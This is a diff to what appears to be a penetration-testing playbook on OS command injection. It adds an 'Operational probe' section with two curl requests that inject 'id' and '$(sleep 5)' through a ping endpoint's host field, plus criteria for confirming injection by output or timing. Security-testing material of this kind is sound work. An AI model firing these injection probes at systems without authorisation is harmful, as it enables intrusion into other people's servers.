@@ -72,6 +72,20 @@ Use one named reference after the sink is confirmed:
 - Output-free injection plus a blocked outbound channel remains inconclusive
   unless the timing delta is repeatable and attributable.
 
+## Operational probe
+
+```bash
+curl -i -b "$JAR" -X POST "$BASE/ping" -d 'host=127.0.0.1;id'
+curl -i -b "$JAR" -X POST "$BASE/ping" -d 'host=$(sleep%205)'
+```
+
+Record the verbatim output block for an injected `id`, or the measured delay
+for blind sinkholes — compare against a 5x serial baseline, not a single
+sample. Confirmation is command output (uid=... in the response) or a
+repeatable timing delta the baseline cannot explain. A 500 or a quoted
+literal is a rejected hypothesis.
+
+
 ## Routing
 
 Shares signals with: `../web-ssti/`. Check those before committing to this one.
